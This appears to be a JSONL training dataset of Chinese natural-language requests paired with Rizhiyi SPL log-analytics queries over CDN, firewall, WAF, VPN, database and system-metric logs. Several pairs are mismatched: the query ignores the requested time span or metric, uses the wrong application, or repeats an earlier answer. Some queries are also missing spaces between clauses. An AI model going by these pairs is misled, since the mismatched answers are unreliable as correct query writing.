{"input": "", "instruction": "我想问有关某些视频流的访问数量和时间分布的信息，具体来说，您想要了解以下哪些信息：1、不同CDN节点（即域名）上的视频流的总共访问次数；2、不同CDN节点上视频流的访问次数随时间变化趋势；3、不同CDN节点上视频流的平均响应时间。使用日志易SPL 查询语言编写相应的搜索条件。首先需要从原始数据中筛选出与 CDN 相关的数据，然后统计各个 CDN 节点的访问量和响应时间等指标。最终得到的结果可以帮助更好地理解这些视频流的访问情况。", "output": "appname:cdn tag:aofei (cdn.domain:vod1.video.com OR cdn.domain:vod2.video.com OR  cdn.domain:vod3.video.com OR cdn.domain:vod4.video.com) | bucket timestamp span=1m as ts | stats count() as count_ by cdn.domain,ts"}
{"input": "", "instruction": "我想询问关于F5负载均衡器的一些信息，比如访问状态和数量等。您可以这样做：1. 使用F5设备的管理控制台或API获取有关负载平衡器的信息，例如其运行状况、连接数等。2. 查询应用日志以获取有关HTTP请求的信息，包括源IP地址、URL路径、响应代码等。3. 将获得的数据与时间戳关联起来，并使用适当的时间范围进行聚合，如每分钟、每小时等。4. 对数据进行可视化分析，以识别出趋势和模式，从而推断出负载均衡器如何处理用户流量。", "output": "appname:loadbalancing tag:f5 AND loadbalancing.type:logger|bucket timestamp span=30m as ts|stats count() as ct by loadbalancing.status,ts|rename ct as \"访问次数\""}
{"input": "", "instruction": "我想跟踪绿盟 IPS的网络流量情况，并统计出每种事件发生的数量和总数。您可以将其视为一种趋势分析，例如，您可以使用stats count（）函数根据IP地址、时间戳和事件名称对数据进行分组，然后使用rename重命名列以获得更有意义的数据。", "output": "appname:ips  tag:nsfocus | bucket timestamp span=1h as ts | stats count() as a by ips.event_name,ts | rename a as \"请求次数\""}
{"input": "", "instruction": "oracle数据库的ORA错误码日志量每5分钟统计趋势", "output": "appname:oracle tag:alert oracle.ORACODE:ORA*  | bucket timestamp span=5m as ts| stats count() by ts,oracle.ORACODE"}
{"input": "", "instruction": "我想询问 Nginx 应用的访问量和流量趋势，关于 Nginx 应用中 URI（统一资源标识符）的访问数量以及每个时间段的访问数量的统计信息。", "output": "appname:pf_nginx AND  [[appname:pf_nginx  |stats count() as count_ by nginx.uri |sort by count_ |limit 10|fields nginx.uri]] | bucket timestamp span=30m as ts| stats count() as count_ by nginx.uri,ts"}
{"input": "", "instruction": "帮我分析数据库安全审计日志中发生的异常情况：1. 在过去一天内（即从当前时间开始向前推移一天），有多少条记录具有“应用名称为 dbaudit 和标签为 dbappsecurity”的日志消息；2. 对这些记录进行分组并计算每个组中的总数目，以获取每种级别（例如 INFO、WARNING 或 ERROR）的事件数量；3. 以分钟为单位将时间范围划分为小时级buckets，并使用直方图统计法计算每个bucket内的事件数量分布曲线，以确定是否存在任何异常或趋势性变化。", "output": "starttime=\"-1d\" (appname:dbaudit AND tag:dbappsecurity) |bucket timestamp span=30m as ts | stats count() as cnt by ts,dbaudit.level"}
{"input": "", "instruction": "waf_imperva_高风险事件今天趋势", "output": "starttime=\"now/d\" endtime=\"now\"appname:waf AND tag:imperva AND (waf.level:High OR waf.level:\"高\")|bucket timestamp span=15m as ts |stats count() by ts|eval ts1=formatdate(ts,\"HHmm\")"}
{"input": "", "instruction": "同花顺请求量今天的趋势", "output": "starttime=\"now/d\" endtime=\"now\"appname:ths_all NOT  (ths_all.ANSTYPE:0 OR ths_all.ANSTYPE:1)|bucket timestamp span=20m as ts |stats count() by ts|eval ts1=formatdate(ts,\"HHmm\")|eval line=\"今天\""}
{"input": "", "instruction": "我想问的是，在哪个时段有人访问过数据库的安全审计功能？你可以把这些数据统计一下，每小时统计一次，并按 IP 和 URL 分组。", "output": "* AND appname:waf tag: dbappsecurity|eval s_ip_url_event= waf.message.src_ip.geo.ip+\"_\"+waf.url+\"_\"+waf.message.event|bucket timestamp span = 1h as ts |stats count() by ts,s_ip_url_event"}
{"input": "", "instruction": "我想问的是在服务器上发生的登录失败次数最多的IP地址是多少，并且按时间段统计。", "output": "appname:aix tag:failedlogin [[appname:aix tag:failedlogin|stats count() as count_ by ip|fields ip]] | bucket timestamp span =30m as ts|stats count() by ip,ts"}
{"input": "", "instruction": "按分钟统计业务流量趋势", "output": "appname:cdn AND (cdn.http_status:404 OR cdn.http_status:5?? OR cdn.http_status:403 OR cdn.http_status:200 OR cdn.http_status:206 )  AND (cdn.domain:live1.video.com OR cdn.domain:live2.video.com OR cdn.domain:live3.video.com) | bucket timestamp span = 1m as ts |  stats sum(cdn.body_size) by ts, cdn.geo.city"}
{"input": "", "instruction": "根据以下直播域名计算 CDN 日志中直播业务异常状态码为 4XX 或 5XX 的请求总体流量和各地区流量分布情况：live1.video.com, live2.video.com, live3.video.com", "output": "appname:cdn AND (cdn.http_status:4?? OR cdn.http_status:5?? )  AND (cdn.domain:live1.video.com OR cdn.domain:live2.video.com OR cdn.domain:live3.video.com) | bucket timestamp span = 1m as ts |  stats sum(cdn.body_size) by ts, cdn.geo.city"}
{"input": "", "instruction": "只看错误状态的", "output": "appname:cdn AND (cdn.http_status:4?? OR cdn.http_status:5?? )  AND (cdn.domain:live1.video.com OR cdn.domain:live2.video.com OR cdn.domain:live3.video.com) | bucket timestamp span = 1m as ts |  stats sum(cdn.body_size) by ts, cdn.geo.city"}
{"input": "", "instruction": "按分钟统计业务流量和 ISP 水平对比分析。", "output": "appname:cdn AND (cdn.http_status:4?? OR cdn.http_status:5?? )  AND (cdn.domain:live1.video.com OR cdn.domain:live2.video.com OR cdn.domain:live3.video.com) | bucket timestamp span = 1m as ts |  stats sum(cdn.body_size) by ts, cdn.geo.isp"}
{"input": "", "instruction": "我想要知道有关aofei CDN 应用的流量和时间段的信息。", "output": "appname:cdn tag:aofei |bucket timestamp span = 1m as ts |  stats sum(cdn.body_size) by appname,ts"}
{"input": "", "instruction": "我想要知道在过去一小时内有多少次防火墙遭到入侵的攻击，并且根据这些攻击名称来分类", "output": "((appname:firewall AND tag:legendsec) AND firewall.mod:ad)|bucket timestamp span = 1h as ts  | stats count() by ts,firewall.attack_name"}
{"input": "", "instruction": "我想问的是最近三十分钟内哪些主机的错误率最高。", "output": "appname:aix tag:last [[tag:last|stats count(hostname) as count_ by hostname| sort by count_ | limit 10|fields hostname]] | bucket timestamp span =30m as ts|stats count(hostname) as count_2 by hostname,ts"}
{"input": "", "instruction": "我想问的是，有没有人访问过我们的网站？按每十分钟统计的话，他们会使用多少下载流量？", "output": "appname:kingdee tag:access|eval value=tolong(middleware.bytes_out) |where middleware.bytes_out!= null |bucket timestamp span=10m as ts |stats sum(value) as cn by ts|rename cn as \"流量\""}
{"input": "", "instruction": "我想询问关于某一段时间内CDN节点的流量情况，具体来说，查询 CDN 服务器名称为 `vod1.video.com`、 `vod2.video.com`、`vod3.video.com` 或 `vod4.video.com` 的节点；2. 根据返回结果中的字段 `bucket`，将数据分桶（即按小时进行分组）；3. 在每个小时的分桶中统计字段 `cdn.body_size` 的总和值；4. 将上述步骤 2 和 3 中得到的数据汇总到各个 CDN 服务器名称下。", "output": "appname:cdn tag:aofei AND (cdn.domain:vod1.video.com OR cdn.domain:vod2.video.com OR  cdn.domain:vod3.video.com OR cdn.domain:vod4.video.com)|bucket timestamp span=1m as ts |  stats sum(cdn.body_size) by appname,ts"}
{"input": "", "instruction": "我想问的是，有每分钟统计 CDN 访问 wapx.example.cn、img.example.cn 和 tv.example.cn 这三个域名的流量数据吗？", "output": "appname:cdn tag:huawei AND (cdn.domain:wapx.example.cn OR cdn.domain:img.example.cn OR  cdn.domain:tv.example.cn) |bucket timestamp span=1m as ts |  stats sum(cdn.body_size) by tag,ts"}
{"input": "", "instruction": "同花顺系统每五分钟时间间隔内，有多少个请求类型为“E”或者“F”的访问？这些请求所带来的总流量是多少？", "output": "appname:ths THS.REQTYPE:/(E|F)/ THS.ANSTYPE:\" \" | bucket timestamp span=5m as ts | stats sum(THS.WTJG) as RMB by ts,THS.REQTYPE"}
{"input": "", "instruction": "我想问的是，我们的直播质量和流畅度如何？请告诉我最近十分钟内每分钟的卡顿率以及最近一小时内的平均画质评价。", "output": "appname:stb_vixtel_sotthas stb_vixtel_sotthas.hasQoE:>=0 stb_vixtel_sotthas.freezeTime:>=0stb_vixtel_sotthas.downloadTime:>=0 NOT stb_vixtel_sotthas.programName:未知|bucket timestamp span=10m as ts|eval hasQoE=todouble(stb_vixtel_sotthas.hasQoE)|eval freezeTime=todouble(stb_vixtel_sotthas.freezeTime)|eval downloadTime=todouble(stb_vixtel_sotthas.downloadTime)|eval freezeRate=(freezeTime/1000000)/downloadTime|stats count(stb_vixtel_sotthas.programName) as playCount,avg(freezeRate) as avg_freezeRate,avg(hasQoE) as avg_hasQoE by ts|eval avg_freezeRate_1=format(\"%.2f\",avg_freezeRate)|eval avg_hasQoE_1=format(\"%.2f\",avg_hasQoE)"}
{"input": "", "instruction": "我想问的是，有多少个请求访问过这个应用名为“appname”的服务，并且带上了标签为“tag:venustech”。并将结果按时间戳分组，每分钟计算出数量并展示在柱状图中。", "output": "appname:ips AND tag:venustech |bucket timestamp span=5m as ts |stats count() as cnt by ts,hostname"}
{"input": "", "instruction": "我想要知道网站的访问量情况，你能帮我查一下吗？我想看看我的博客每天都有多少人浏览。", "output": "* appname:DNS |  bucket timestamp span=1d as ts | stats count() as count_ by ts "}
{"input": "", "instruction": "我想要知道某一天每小时内每个应用的访问量分布情况。", "output": "appname:ips  tag:nsfocus | bucket timestamp span=1h as ts | stats count(ips.dst.geo.ip) by appname,ts"}
{"input": "", "instruction": "我想要知道在 H3C 上的交换机发生的情况，包括成功和失败的数量以及每个小时的时间戳。", "output": "appname:switch  tag:h3c switch.event_type:* AND (switch.result:successfully OR switch.result:failed)|bucket timestamp span=1h as ts  |stats count() as cnt by switch.result,ts"}
{"input": "", "instruction": "询问的是CDN服务商为某一时段内的每个应用做了多少次缓存命中请求。", "output": "appname:cdn tag:huawei  AND cdn.cdn_status:*HIT| bucket timestamp span=1m as ts | stats count() by appname,ts"}
{"input": "", "instruction": "我想跟踪中国境内的网络流量情况。你想要知道每天都有多少人从哪些省份访问你的网站。", "output": "appname:squid_log|bucket timestamp span=1d as ts|stats count(squid.geo.province) as total by ts, squid.geo.province"}
{"input": "", "instruction": "帮我做个日志分析吧，我需要统计 `squid_log` 这个应用在一天内（即 `span=1d`）的所有访问记录中，分别按时间戳和源站ISP进行分组，并计算每个分组中的访问数量，以便于对不同ISP的访问量进行比较。", "output": "appname:squid_log|bucket timestamp span=1d as ts|stats count(squid.geo.isp) as total by ts, squid.geo.isp"}
{"input": "", "instruction": "以下内容：这个查询语句的含义是：从名为`cdn_log`且包含字段`cdn.request_domain`等于`docs.rizhiyi.com`或`bucket`的文档中检索出时间戳为一天的时间范围内的所有字段名为`ts`且包含字段`cdn.remote_addr`的数据，并统计每个`cdn.remote_addr`出现的次数。", "output": "appname:cdn_log AND cdn.request_domain:docs.rizhiyi.com|bucket timestamp span=1d as ts|stats count(cdn.remote_addr) as total by ts,cdn.remote_addr"}
{"input": "", "instruction": "我想要知道哪个运营商的人最多访问我的nginx。你能帮我把这些数据画成图表吗？我想看一下每天的访问量和每个运营商的人数分布情况。", "output": "appname:nginx_log | bucket timestamp span=1h as ts |stats count(nginx.geo.isp) as total by nginx.geo.isp, ts"}
{"input": "", "instruction": "我想要知道在交易所的 appname 为 exchange、bucket 和时间戳为当前时间点的 span=5 分钟的数据有多少条记录，并按 tag 对这些数据进行分组，然后计算每个 tag 下每分钟的数量。", "output": "appname:exchange |bucket timestamp span=5m as ts |stats count() as ct by ts,tag |eval time=formatdate(ts,\"HH:mm:ss\")"}
{"input": "", "instruction": "我想问的是，按每 五分钟统计 VPN 用户登录的数量有多少？并且先按用户做分组统计，只取前 10 个用户。", "output": "appname:vpn tag:sangfor vpn.actype:access* appname:vpn tag:sangfor  [[appname:vpn tag:sangfor vpn.actype:access* appname:vpn tag:sangfor  |stats count(vpn.login_user) as count_ by vpn.login_user|sort by count_|limit 10|fields  vpn.login_user]] | bucket timestamp span=5m as ts|stats count(vpn.login_user)  as count_ by vpn.login_user,ts"}
{"input": "", "instruction": "我想要知道在每个服务器上的活动线程数量分布趋势。", "output": "appname:weblogic|bucket timestamp span=10m as ts|stats dc(middleware.thread) as '活动线程数' by middleware.server, ts"}
{"input": "", "instruction": "统计每分钟里每个标签下的数据流量总和。", "output": "appname:cdn tag:huawei  |bucket timestamp span=1m as ts |  stats sum(cdn.body_size) by tag,ts"}
{"input": "", "instruction": "我想询问应用名称为“signal”的信号量数据集中的某些指标信息，并希望通过分析这些指标来了解某个时间段内的用户等待情况。appname=\"signal\"`表示要筛选出与指定的应用名称匹配的数据记录；`bucket _time span=30m`表示将时间字段 `_time`按分钟进行桶化，每个桶的大小为30分钟；`eval time = format_time(\"%H:%M\", _time)`表示对时间字段`_time`的值使用格式字符串\"%H:%M\"转换成人类可读的时间字符串；`stats sum(queue_length) as cnt by time,signal.lane_name` 表示按时间和信号量分组统计队列长度的总和", "output": " appname:signal|bucket timestamp span=30m as ts |eval time=formatdate(ts,\"HH:mm\") |stats sum(signal.queue_length) as cnt by time,signal.lane_name|sort by signal.lane_name,cnt|dedup 1 signal.lane_name"}
{"input": "", "instruction": "我想询问应用名称为“signal”的桶中，过去三十分钟内的时间间隔为每分钟一次的数据点数量统计信息，并按车道进行汇总和去重。", "output": " 'appname':signal|bucket timestamp span=30m as ts |eval time=formatdate(ts,\"HH:mm\") |eval lane=tolong(signal.lane_name)|stats sum(signal.queue_length) as cnt by time,lane|sort by lane,cnt|dedup 1 lane"}
{"input": "", "instruction": "我想问如何使用日志易SPL（Search Processing Language）编写搜索语句。这个搜索语句会在你的索引中查找包含“signal”字符串且属于某一应用名为“signal”的条目，并计算每小时内该应用的排队数量的总和，并将结果按车道分组显示。", "output": " 'appname':signal|bucket timestamp span=30m as ts |eval lane=tolong(signal.lane_name)|stats avg(signal.queue_length) as cnt by ts,lane"}
{"input": "", "instruction": "我想要知道 softehter VPN app 使用情况和错误数量统计，以及每个错误发生的时间。请告诉我如何获取这些信息。", "output": "appname:vpn tag:softether vpn.action:* |bucket timestamp span=30m as ts | eval time=formatdate(timestamp,\"HH:mm\") | stats dc(time) as cnt by vpn.action,ts"}
{"input": "", "instruction": "我想问的是什么数据库的哪个实例的哪些表在什么时间段内每分钟的平均响应时间是多少。", "output": "appname:postgresql   postgresql.duration:* | bucket timestamp span=5m as ts| stats avg(postgresql.duration) as avg_duration by postgresql.database,ts"}
{"input": "", "instruction": "我想问如何编写日志易查询以获取应用 \"cnap\"、响应系统 ID 为 \"CNAP\" 和操作为 \"*\"（所有操作）的记录中的最小时间戳和最大时间戳以及每个日志 ID 下的成本平均值。", "output": "appname:cnap cnap.respSysId:CNAP cnap.action:* | stats min(timestamp) as _min,max(timestamp) as _max by cnap.logId | eval cost=_max-_min | bucket _min span=10m as ts | stats avg(cost) as _avg by ts | eval avg_cost=format(\"%.2f\",_avg) "}
{"input": "", "instruction": "我想要知道系统内存使用率的平均值，并且按 IP 分组，每小时计算一次。", "output": "appname:top_info_system_stats |bucket timestamp span=1h as _time |stats avg(Mem.used_percent) as cnt by ip,_time"}
{"input": "", "instruction": "我想要从过去一小时内的所有 appname:switch 应用的错误日志中检索所有具有 huawei 标签且严重性低于等于 4 的条目，并按模块分组，然后计算每个模块出现的次数。", "output": "appname:switch tag:huawei switch.severity:<4 [[appname:switch tag:huawei switch.severity:<4 | top 10 switch.module|fields switch.module]] | bucket timestamp span=1h as ts|stats count() as count_ by ts,switch.module"}
{"input": "", "instruction": "我想问有关 VPN（虚拟私人网络）应用的登录用户为“root”、活动类型为“登录”且在每三十分钟内发生的次数统计结果的信息。", "output": "appname:vpn vpn.login_user:root vpn.actype:login  | bucket timestamp span=30m as ts|stats count() as cnt by vpn.result,ts"}
{"input": "", "instruction": "我想要知道有多少条数据符合以下条件：- 来源于 appname 为 waf 和 tag 为 fortinet 的请求- 数据被存储在 bucket 中- 创建时间距离当前时间不超过 30 分钟- 每个键的类型为 waf.kv.type", "output": "appname:waf tag:fortinet |bucket timestamp span=30m as ts | stats count() as cnt by waf.kv.type,ts"}
{"input": "", "instruction": "我想询问每三十分钟内，STB_VIXTEL_SMPEGTS应用的平均码率是否高于或等于零，同时又不包括程序名称为“未知”的记录数和平均丢包率。", "output": "appname:stb_vixtel_smpegts stb_vixtel_smpegts.avgMos:>=0 stb_vixtel_smpegts.tsLostRate:>=0stb_vixtel_smpegts.avgThroughput:>=0 NOT stb_vixtel_smpegts.programName:未知|bucket timestamp span=30m as ts|eval tsLostRate=todouble(stb_vixtel_smpegts.tsLostRate)|stats count(stb_vixtel_smpegts.programName) as playCount,avg(tsLostRate) as avg_tsLostRate by ts|eval avg_tsLostRate_1=format(\"%.2f\",avg_tsLostRate)"}
{"input": "", "instruction": "我想询问的是关于某视频流的播放情况，其中包括以下几个维度：1. 播放次数（playCount）2. 每次暂停时间（freezeTime1）3. 每次下载时间（downloadTime1）4. 活跃时长与总时长之比（liveFreezeRate）！", "output": "appname:stb_vixtel_smpegts (stb_vixtel_smpegts.freezeTime:>=0 AND stb_vixtel_smpegts.downloadTime:>=0)|bucket timestamp span=30m as ts|eval freezeTime=tolong(stb_vixtel_smpegts.freezeTime)|eval downloadTime=tolong(stb_vixtel_smpegts.downloadTime)| stats count(stb_vixtel_smpegts.programName) as playCount,avg(freezeTime) as freezeTime1,avg(downloadTime) as downloadTime1 by ts|eval liveFreezeRate=format(\"%.3f\",(freezeTime1/1000000)/downloadTime1)"}
{"input": "", "instruction": "我想要知道在 fortress 中有哪些应用名称包含 pldsec 的用户登录信息，并且每分钟统计一次数量并将结果保存为时间序列（ts）和应用（appname）字段以及用户（fortress.user）字段的计数器（ct）。", "output": "( appname:fortress tag:pldsec ) \"BLJPri xwin\" sessiontype=login|bucket timestamp span=5m as ts|stats count() as ct by ts,fortress.user"}
{"input": "", "instruction": "我想表达的意思是：这个查询语句表示从`appname`为`process`且满足`(process.local_addr:* OR process.proto:tcp)`的事件中获取`timestamp`，将其划分为10分钟的时间桶，并统计每个时间桶内不同状态类型的数量。", "output": "* AND appname:process process.local_addr:* process.proto:tcp  |eval t=process.proto+\"_\"+process.state |bucket timestamp span=10m as ts |stats count() as cnt by t,ts"}
{"input": "", "instruction": "帮我编写日志易查询语句。搜索应用名为“aix”且包含“登录成功”的事件，并将结果按目标主机和时间分组，计算每个时间段内的数量，生成一个名为“ct”、值类型为计数器的字段。", "output": "appname:aix AND \"Login successful for\" |bucket timestamp span=10m as ts|stats count() as ct by aix.dst_host,ts"}
{"input": "", "instruction": "我想询问以下内容：> 查询 appname 为 'ips' 和 tag 为 'nsfocus' 的数据，并将结果按时间桶为 10 分钟，统计每个时间桶内的事件数量（即请求数）并以字段名为 `a`、值名为 `ips.event_name`、`ts` 的形式返回；然后对该结果进行重命名，将字段名为 `a` 的值改名为 `\"请求次数\"`。", "output": "appname:ips  tag:nsfocus | bucket timestamp span=10m as ts | stats count() as a by ips.event_name,ts | rename a as \"请求次数\""}
{"input": "", "instruction": "我想要知道有关 Imperva Web Application Firewall (WAF) 的一些信息，例如错误数量、事件名称和时间戳等。使用时间桶函数将数据分组为每 10 分钟一组，然后使用统计函数计算每个 WAF 事件名称及其发生次数的计数器。", "output": "appname:waf  tag:imperva |bucket timestamp span=10m as ts |stats count() by waf.event_name,ts"}
{"input": "", "instruction": "我想问的是 nginx 这个服务的 access log 中，每 10分钟请求数量最多的方法是哪个？", "output": "appname:nginx tag:access |bucket timestamp span=10m as ts |stats count() by ts,middleware.request_method"}
{"input": "", "instruction": "我想问如何使用日志易查询获得legendsec应用的访问 IP 和事件名称、分桶时间戳为 10 分钟的时间间隔内的请求数量（即每分钟的平均请求数）并将其重命名为“请求次数”。", "output": "appname:ips tag:legendsec| bucket timestamp span=10m as ts | stats count() as a by ips.event_name,ts | rename a as \"请求次数\""}
{"input": "", "instruction": "我想问有关 SANGFOR CDN 服务的访问量和时序数据的统计情况。我正在寻找关于 SANGFOR CDN 在一小时的内每分钟的请求数量以及相应的时间戳的数据。", "output": "(appname:cdn AND tag:sangfor) SSL|bucket timestamp span=1h as ts|stats count() as cnt by ts "}
{"input": "", "instruction": "帮我分析访问Apache服务的日志中，对某一时间段内（1小时）每个中间件的方法做出访问次数统计并将结果以表格的形式展示给用户。", "output": "appname:apache tag:access|bucket timestamp span=1h as ts|stats count() as count_ by middleware.method,ts"}
{"input": "", "instruction": "我想跟踪newdon的防火墙日志量趋势，并希望对目标端口数据进行分组和汇总。您需要使用 `timestamp`、`span=1h` 和 `as ts` 将时间戳列别名为 `ts`，然后使用 `stats` 命令计算每个时间段内端口数量的频率。", "output": "appname:firewall tag:newdon firewall.type:secure|bucket timestamp span=1h as ts|stats count() by ts,firewall.dst_port"}
{"input": "", "instruction": "我想问以下信息：- 查询时间范围内，CDN服务商“华为”的业务请求响应体大小大于等于3字节的数据包数量；- 分组依据标签（tag）和时间戳（ts），统计每个分组的时间间隔内数据包数量的总和。", "output": "appname:cdn tag:huawei  cdn.finished_body_response:>3  |bucket timestamp span=1m as ts | stats count() by tag,ts"}
{"input": "", "instruction": "我正在寻找关于ESXI主机上API、标签为“api”并且有关网络接口出口（if_out）的指标的数据，并希望通过计算每秒的平均值来了解其使用情况。", "output": "appname:esxi tag:api esxi.metric:esxi.net.if.out|bucket timestamp span=1m as ts | stats count() by ts,esxi.tags.host,esxi.value|eval if_out=todouble(esxi.value)| eval usage=if_out/1024 |eval Mb=format(\"%.2f\",usage)"}
{"input": "", "instruction": "我想要知道有多少条记录满足以下条件：`appname: firewall AND tag: hillstone` ，并将结果聚合为每 30 分钟的总数，并将总数重命名为“数量”。", "output": "appname:firewall AND tag:hillstone |bucket timestamp span=30m as ts | stats count() as total by ts|rename total as \"数量\""}
{"input": "", "instruction": "我想要知道有哪些应用在访问 NSFocus 的服务上比较多的 IP 地址和端口信息，并且统计出每秒钟的请求数量。", "output": "appname:ips  tag:nsfocus | bucket timestamp span=30m as ts | stats count()  as a by ips.proto,ts"}
{"input": "", "instruction": "我想询问 apache 应用的访问日志中，包含 access 和 middleware.status 字段的数据，并按中间件状态码和时间戳进行分组统计，结果每行显示两个值：中间件状态码和数量（count）。", "output": "appname:apache tag:access middleware.status:>399|bucket timestamp span=30m as ts| stats count() as count_ by middleware.status,ts"}
{"input": "", "instruction": "WebLogic应用中访问状态（middleware.request_status）异常数据，在每 30 分钟内的请求数量（count）。", "output": "appname:weblogic tag:access middleware.request_status:>399|bucket timestamp span=30m as ts| stats count() as count_ by middleware.request_status,ts"}
{"input": "", "instruction": "我想询问以下内容：这段代码的含义是：根据字段`timestamp`，将时间间隔为`30分钟`的数据聚合到同一行中，并统计每个结果类型（`uninxg.iresulttype`）出现的次数。", "output": "appname:uninxg tag:leagsoft uninxg.log_type:userAuthInfo|bucket timestamp span=30m as ts | stats count() as cnt by ts,uninxg.iresulttype"}
{"input": "", "instruction": "我想询问 SonicWall Firewall 用户的访问地点数量以及每个地区的访问次数和时间分布情况。", "output": "(* AND appname:firewall) AND tag:sonicwall [[(* AND appname:firewall) AND tag:sonicwall | top 5 firewall.dst.geo.city  | fields firewall.dst.geo.city ]] | bucket timestamp span=30m as ts | stats count() by firewall.dst.geo.city,ts"}
{"input": "", "instruction": "我想问的是 PostgreSQL 有哪些数据库，发生错误的严重级别分别为什么？时间戳间隔为五分钟的时间范围内，每个数据库出现的错误数量有多少？", "output": "appname:postgresql NOT postgresql.error_severity:LOG|bucket timestamp span=5m as ts | stats count() by postgresql.database,ts"}
{"input": "", "instruction": "我想询问的是：`sum(count) by appname, time`。这个统计方法会计算出每个应用在时间范围内的请求数量之和。", "output": "appname:firewall tag:sangfor firewall.action:拒绝|bucket timestamp span=5m as ts |stats count() as count_1 by firewall.app_name,ts"}
{"input": "", "instruction": "我想问的是：在 appname 为 ddos 和 tag 为 nsfocus 的日志中，每分钟统计出攻击类型为 ddos.attack_type 的数量并将结果保存到名为 ts 的时间序列中。", "output": "appname:ddos tag:nsfocus  |bucket timestamp span=5m as ts | stats count() by ddos.attack_type,ts"}
{"input": "", "instruction": "帮我分析 CDN 访问日志中每个省份的请求数量情况。", "output": "appname:cdn_log|bucket timestamp span=1h as ts|stats count(cdn.geo.province) as total by ts, cdn.geo.province"}
{"input": "", "instruction": "我想问有关 Varnish 访问日志中每小时统计的 IP 次数的信息", "output": "appname:varnish_log|bucket timestamp span=1h as ts|stats count(varnish.remote_addr) as total by ts,varnish.remote_addr"}
{"input": "", "instruction": "我想问有关某些应用、域名和存储桶的CDN访问记录数量以及这些访问记录中每个远程地址的数量的信息。", "output": "appname:cdn_log AND cdn.request_domain:email.rizhiyi.com|bucket timestamp span=1d as ts|stats count(cdn.remote_addr) as total by ts,cdn.remote_addr"}
{"input": "", "instruction": "我想问有关 Oracle 审计的一些问题，所以我的回答应该包括以下几个方面：1. appname:oracle AND tag:audit oracle.osprivilege:SYSDBA - 此部分表示我正在寻找与Oracle应用相关的审核记录，同时要求用户具有SYSDBA特权。2. bucket timestamp span=10m as ts - 此部分表示将时间戳划分为10分钟的时间桶，并将结果存储在变量ts中。3. stats count() as cn by oracle.user,ts - 此部分表示使用统计函数计算每个用户在每个时间桶内的请求数量，并将结果保存在cn和oracle.user两个字段中。", "output": "appname:oracle AND tag:audit oracle.osprivilege:SYSDBA |bucket timestamp span=10m as ts |stats count() as cn by oracle.user,ts"}
{"input": "", "instruction": "我想要知道网站 cdn 的访问量和时间分布情况。请告诉我最近一分钟的请求数量以及每个时间段的请求数量。", "output": "appname:cdn tag:aofei | bucket timestamp span=1m as ts | stats count() as count_ by ts "}
{"input": "", "instruction": "搜索应用名为“aix”且包含“登录成功的”消息的主机统计信息，并将结果划分为每 10 分钟的时间段。", "output": "appname:aix AND \"Login successful for\" |bucket timestamp span=10m as ts|stats count() as ct by aix.dst_host,ts "}
{"input": "", "instruction": "我想要知道公司最近六小时内的每个应用发送的报价数量。", "output": "tag:mail \"报价\"|bucket timestamp span=6h as ts|stats count() by ts,appname"}
{"input": "", "instruction": "帮我分析某些安全审计报告中的访问控制问题。需要统计 `sangfor` 应用的访问控制日志中每种消息类型的数量以及每个时间戳的数量。", "output": "appname:access_control tag:sangfor access_control.log_type:* | bucket timestamp span=20m as ts | stats count() as cnt by ts,access_control.message"}
{"input": "", "instruction": "我想问的是每三十分钟内top10主机的日志数量是多少？", "output": "appname:aix tag:last [[tag:last|stats count(hostname) as count_ by hostname| sort by count_ | limit 10|fields hostname]]| bucket timestamp span=30m as ts|stats count(hostname) as count_2 by hostname,ts"}
{"input": "", "instruction": "我想问的是，最近三个月内，哪个 URI 在 WAF 防火墙中被访问次数最多？可以按时间段为一组，每组间隔 30 分钟。", "output": "appname:waf tag:river AND  [[appname:waf tag:river |stats count() as count_ by waf.uri|sort by count_ |limit 10|fields waf.uri]] | bucket timestamp span=30m as ts| stats count() as count_ by waf.uri,ts"}
{"input": "", "instruction": "我想要知道在过去五分钟内，Informix 应用的线上日志中，每秒平均使用的磁盘空间有多大。", "output": "starttime=\"-5m/m\" endtime=\"now/m\"appname:informix tag:online_log |  bucket timestamp span=1m as ts| stats avg(informix.plog_used) as count_1"}
{"input": "", "instruction": "请帮我找出过去一天中，每个小时使用的内存百分比的平均数。", "output": "starttime=\"now-1d/d\" endtime=\"now\"  appname:top_info_system_stats |bucket timestamp span=1h as ts |stats avg(Mem.used_percent) as cnt by ts |eval day=formatdate(ts,\"yyyy-MM-dd\") |eval hour=formatdate(ts,\"HH:mm\")"}
{"input": "", "instruction": "我想问的是 CPU 使用率的平均值和各个时间段内的 CPU 使用率分布情况，具体包括：昨天的 CPU 使用率分布情况（每小时）", "output": "starttime=\"now-1d/d\" endtime=\"now\"  appname:top_info_system_stats |bucket timestamp span=1h as ts |eval cpu_uesd=(100-cpu.idle_percent)/100 |stats avg(cpu_uesd) as cnt by ts |eval day=formatdate(ts,\"yyyy-MM-dd\") |eval hour=formatdate(ts,\"HH:mm\")"}
{"input": "", "instruction": "我在询问有关 SonicWall Firewall 的某些统计信息：获取过去一天内所有与 SonicWall Firewall 有关的日志条目数量的总和，并且将结果按时间分组并显示为每 30 分钟的时间段。", "output": "starttime=\"-1d\" (* AND appname:firewall) AND tag:sonicwall | bucket timestamp span=30m as ts | stats count() as total by ts "}
{"input": "", "instruction": "我想要知道最近一天山石网科的 bds 日志，每小时发生次数最多的事件类型和对应的时间段。", "output": "starttime=\"-1d\" appname:bds tag:hillstone | bucket timestamp span=1h as ts  | stats count() as cnt by bds.event_type,ts"}
{"input": "", "instruction": "我想问的是，过去一天有多少条记录属于“反病毒软件”的日志？并按时间对它们进行分组，每组包含三十分钟的时间范围内的所有记录。", "output": "starttime=\"-1d\" appname:antivirus |bucket timestamp span=30m as ts | stats count() as cnt by ts,anti.log_name"}
{"input": "", "instruction": "我想要知道在今天有多少次出现了 ERROR 类型的 Kafka 事件，并且将这些事件数量进行分组并计算每个时间段内的总数。", "output": "starttime=\"now/d\" endtime=\"now\" (appname:kafka kafka.event_type:ERROR)|bucket timestamp span=1h as ts | stats count() by ts "}
{"input": "", "instruction": "我想问的是平均耗时是多少，你能帮我把这个数据画成折线图吗？", "output": "appname:cbv7 tag:tuxedo cbv7.total_cost:* | eval total_cost=cbv7.total_cost / 1000 | bucket timestamp span=10m as ts | stats avg(total_cost) as _avg by ts | eval avg_cost=format(\"%.2f\",_avg)"}
{"input": "", "instruction": "我想问的是系统内存使用率的平均值，按 IP 分组，时间分段为一天的数据。", "output": "appname:top_info_system_stats |bucket timestamp span=1d as _time |stats avg(Mem.used_percent) as cnt by ip,_time"}
